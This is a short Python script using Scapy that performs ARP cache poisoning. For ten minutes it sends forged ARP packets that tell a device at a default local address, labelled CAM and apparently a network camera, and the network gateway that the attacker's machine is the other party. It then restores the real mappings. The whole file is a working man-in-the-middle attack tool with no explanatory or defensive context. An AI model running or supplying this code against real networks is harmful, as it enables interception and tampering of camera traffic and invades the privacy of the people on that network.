from scapy.all import ARP, sendp, get_if_hwaddr, Ether, IP, UDP
import time, socket
import sys
IF="en1"; CAM=sys.argv[1] if len(sys.argv)>1 else "192.168.4.24"; CAMMAC=sys.argv[2] if len(sys.argv)>2 else "80:48:2c:4b:cf:0b"; GW=sys.argv[3] if len(sys.argv)>3 else "192.168.4.1"; GWMAC=sys.argv[4] if len(sys.argv)>4 else "48:dd:0c:c9:ec:0d"
me=get_if_hwaddr(IF); cam_mac=CAMMAC; gw_mac=GWMAC
end=time.time()+600
while time.time()<end:
    sendp(ARP(op=1, psrc=GW, pdst=CAM, hwdst=cam_mac, hwsrc=me), iface=IF, verbose=0)
    sendp(ARP(op=2, psrc=GW, pdst=CAM, hwdst=cam_mac, hwsrc=me), iface=IF, verbose=0)
    sendp(ARP(op=1, psrc=CAM, pdst=GW, hwdst=gw_mac, hwsrc=me), iface=IF, verbose=0)
    time.sleep(0.7)
for _ in range(4):
    sendp(ARP(op=2, psrc=GW, pdst=CAM, hwdst=cam_mac, hwsrc=gw_mac), iface=IF, verbose=0)
    sendp(ARP(op=2, psrc=CAM, pdst=GW, hwdst=gw_mac, hwsrc=cam_mac), iface=IF, verbose=0)
    time.sleep(0.2)
